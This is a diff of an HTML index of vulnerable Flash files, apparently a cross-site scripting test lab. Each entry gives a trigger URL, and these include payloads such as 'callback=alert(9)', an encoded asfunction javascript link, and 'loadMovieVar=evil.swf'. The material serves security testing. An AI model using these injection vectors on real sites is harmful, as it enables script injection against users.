@@ -108,6 +108,24 @@
 
     </br>
     <li>
+        aflax.swf : ExternalInterface
+        <ul>
+            <li>source - Google</li>
+            <li>trigger - <b>files/aflax.swf?callback=alert(9)</b></li>
+        </ul>
+    </li>
+
+    </br>
+    <li>
+        show.swf : ExternalInterface
+        <ul>
+            <li>source - http://www.glitter-text-maker.de/glitters.swf</li>
+            <li>trigger - <b>files/show.swf</b></li>
+        </ul>
+    </li>
+
+    </br>
+    <li>
         redirect.swf : geturl()
         <ul>
             <li>source - Google</li>
@@ -132,6 +150,7 @@
             <li>trigger - <b>files/vulnerable.swf?htmlVar=%3Ca%20href%3D%22asfunction%3AgetURL%2Cjavascript%3Aalert%28%27gotcha%21%27%29%22%3E%20Click%20here%3C%2fa%3E</b></li>
         </ul>
     </li>
+
     </br>
     <li>
         Vulnerable.swf : loadmovie() - Single click
@@ -140,6 +159,16 @@
             <li>trigger - <b>files/vulnerable.swf?loadMovieVar=evil.swf</b></li>
         </ul>
     </li>
+
+    </br>
+    <li>
+        top.swf : loadmovie() - Single click
+        <ul>
+            <li>source - Google</li>
+            <li>trigger - <b>files/top.swf</b></li>
+        </ul>
+    </li>
+
     </br>
     <li>
         Pie3D.swf : Parameters from xml - Click
@@ -148,6 +177,7 @@
             <li>trigger - <b>files/Pie3D.swf?dataURL=xss.xml</b></li>
         </ul>
     </li>
+
     </br>
     <li>
         link_protocol_test.swf : navigateToUrl() - Only Firefox
